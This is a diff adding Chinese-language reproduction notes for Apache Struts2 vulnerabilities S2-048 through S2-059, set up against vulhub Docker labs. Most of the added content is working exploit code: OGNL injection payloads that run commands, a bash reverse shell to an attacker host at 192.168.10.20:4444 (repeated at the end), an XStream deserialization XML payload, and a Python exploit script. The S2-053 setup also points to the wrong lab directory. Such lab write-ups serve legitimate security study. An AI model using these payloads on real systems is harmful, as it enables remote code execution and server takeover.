@@ -631,8 +631,285 @@ cd vulhub/struts2/s2-048
 docker-compose up -d
 ```
 
+访问 `http://your-ip:8080/integration/saveGangster.action` ，查看如下页面
+
+![s2-048-1](images/s2-048-1.png)
+
+任意命令执行 PoC，执行 `id` 命令，将 PoC 替换为 `name` 参数的值，注意需要 urlencode
+
+```
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
+```
+
+![s2-048-2](images/s2-048-2.png)
+
+任意命令执行 PoC，执行 `cat /etc/passwd` 命令，将 PoC 替换为 `name` 参数的值，注意需要 urlencode
+
+![s2-048-3](images/s2-048-3.png)
+
+反弹 Shell，执行 `bash -i >& /dev/tcp/192.168.10.20/4444 0>&1` 命令，将 PoC 替换为 `name` 参数的值，注意需要 urlencode，其中 `192.168.10.20/4444` 为 kali 的 IP 地址和端口
+
+```
+%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/192.168.10.20/4444 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b"
+```
+
+![s2-048-4](images/s2-048-4.png)
+
+![s2-048-5](images/s2-048-5.png)
+
+## S2-052
+
+Struts2 REST 插件的 XStream 组件存在反序列化漏洞，使用 XStream 组件对 XML 格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。
+
+Struts2-Rest-Plugin 是让 Struts2 能够实现 Restful API 的一个插件，其根据 Content-Type 或 URI 扩展名来判断用户传入的数据包类型，有如下映射表：
+
+| 扩展名 | Content-Type                      | 解析方法                 |
+| ------ | --------------------------------- | ------------------------ |
+| xml    | application/xml                   | xstream                  |
+| json   | application/json                  | jsonlib 或 jackson(可选) |
+| xhtml  | application/xhtml+xml             | 无                       |
+| 无     | application/x-www-form-urlencoded | 无                       |
+| 无     | multipart/form-data               | 无                       |
+
+jsonlib 无法引入任意对象，而 xstream 在默认情况下是可以引入任意对象的（针对 1.5.x 以前的版本），方法就是直接通过 xml 的 tag name 指定需要实例化的类名：
+
+```xml
+<classname></classname>
+//或者
+<paramname class="classname"></paramname>
+```
+
+所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在 Struts2 库中适用的 gedget。
+
+### 影响版本
+
+- [x] Struts 2.1.2 - 2.3.33
+- [x] Struts 2.5 - 2.5.12
+
+### 漏洞复现
+
+运行靶场
+
+```bash
+git clone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-052
+docker-compose up -d
+```
+
+访问 `http://your-ip:8080/integration/saveGangster.action` ，查看如下页面
+
+![s2-052-1](images/s2-052-1.png)
+
+由于 `rest-plugin` 会根据 URI 扩展名或 `Content-Type` 来判断解析方法，所以我们只需要修改 `orders.xhtml` 为 `orders.xml` 或修改 `Content-Type` 头为 `application/xml`，即可在 Body 中传递 XML 数据。
+
+PoC 如下：
+
+```xml
+POST /orders/3/edit HTTP/1.1
+Host: your-ip:8080
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/xml
+Content-Length: 2415
+
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <initialized>false</initialized>
+                <opmode>0</opmode>
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <iter class="javax.imageio.spi.FilterIterator">
+                    <iter class="java.util.Collections$EmptyIterator"/>
+                    <next class="java.lang.ProcessBuilder">
+                      <command>
+                        <string>touch</string>
+                        <string>/tmp/success</string>
+                      </command>
+                      <redirectErrorStream>false</redirectErrorStream>
+                    </next>
+                  </iter>
+                  <filter class="javax.imageio.ImageIO$ContainsFilter">
+                    <method>
+                      <class>java.lang.ProcessBuilder</class>
+                      <name>start</name>
+                      <parameter-types/>
+                    </method>
+                    <name>foo</name>
+                  </filter>
+                  <next class="string">foo</next>
+                </serviceIterator>
+                <lock/>
+              </cipher>
+              <input class="java.lang.ProcessBuilder$NullInputStream"/>
+              <ibuffer></ibuffer>
+              <done>false</done>
+              <ostart>0</ostart>
+              <ofinish>0</ofinish>
+              <closed>false</closed>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+</map>
+```
+
+## S2-053
+
+Struts2 在使用 `Freemarker` 模板引擎的时候，同时允许解析 OGNL 表达式。导致用户输入的数据本身不会被 OGNL 解析，但由于被 `Freemarker` 解析一次之后变成了一个表达式，被 OGNL 解析第二次，导致任意命令执行漏洞。
+
+### 影响版本
+
+- [x] Struts 2.0.1 - 2.3.33
+- [x] Struts 2.5 - 2.5.10
+
+### 漏洞复现
+
+运行靶场
+
+```bash
+git clone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-052
+docker-compose up -d
+```
+
+访问 `http://your-ip:8080/hello.action` ，查看如下页面
+
+![s2-053-1](images/s2-053-1.png)
+
+任意命令执行 PoC ，执行 `id` 命令：
+
+```
+redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmds%3D%28%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27id%27%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0A
+```
+
+![s2-053-2](images/s2-053-2.png)
+
+## S2-057
+
+当 Struts2 的配置满足以下条件时：
+
+1. `alwaysSelectFullNamespace` 值为 `true`
+2. `action` 元素未设置 `namespace` 属性，或使用了通配符
+
+`namespace` 将由用户从 `uri` 传入，并作为 OGNL 表达式计算，最终造成任意命令执行漏洞。
+
+### 影响版本
+
+- [x] 小于等于 Struts 2.3.34
+- [x] Struts 2.5.16
+
+### 漏洞复现
+
+运行靶场
+
+```bash
+git clone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-057
+docker-compose up -d
+```
+
+访问 `http://your-ip:8080/showcase` ，查看如下页面
+
+![s2-057-1](images/s2-057-1.png)
+
+测试 OGNL 表达式`${233*233}`:
+
+```
+http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action
+```
+
+![s2-057-2](images/s2-057-2.png)
+
+可见 233\*233 的结果已返回在 Location 头中。
+
+使用 S2-057 复现过程中给出的执行任意命令的 OGNL 表达式:
+
+urlencode 前
+
+```
+${
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
+```
+
+urlencode 后
+
+```
+%24%7b%0d%0a%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%7d
+```
+
+将编码后的 PoC 放在 `struts2-showcase/` 和 `/actionChain1.action` 之间，执行结果如下
+
+![s2-057-3](images/s2-057-3.png)
+
+## S2-059
+
+Struts2 会对某些标签属性（比如 `id`，其他属性有待寻找）的属性值进行二次表达式解析，当这些标签属性中包含了 `%{xx}` 且 `xx` 用户可控，则在渲染该标签时可造成 ognl 表达式执行。
+
+### 漏洞影响
+
+- [X] Struts 2.0.0 - 2.5.20
+
+### 漏洞复现
+
+运行靶场
+
+```bash
+git clone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-059
+docker-compose up -d
+```
+
 访问 `http://your-ip:8080` ，查看如下页面
 
+![s2-059-1](images/s2-059-1.png)
+
+验证漏洞是否存在
+
+```
+http://your-ip:8080/?id=%25{9*9}
+```
+
+![s2-059-2](images/s2-059-2.png)
+
+任意命令执行 PoC
+
+```python
+import requests
+
+url = "http://127.0.0.1:8080"
+data1 = {
+    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
+}
+data2 = {
+    "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}"
+}
+res1 = requests.post(url, data=data1)
+# print(res1.text)
+res2 = requests.post(url, data=data2)
+# print(res2.text)
+```
+
+![s2-059-3](images/s2-059-3.png)
+
+![s2-059-4](images/s2-059-4.png)
 
 
 ## Tools
@@ -644,3 +921,5 @@ docker-compose up -d
 - [Struts2 漏洞复现集合-Freebuf](https://www.freebuf.com/articles/web/280245.html)
 - [Struts2 漏洞集合分析与梳理-跳跳糖](https://tttang.com/archive/1583/#toc_0x00-s2-001)
 - [Struts2 系列漏洞调试总结-素十八](https://su18.org/post/struts2-5/)
+
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#\_memberAccess?(#\_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/192.168.10.20/4444 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
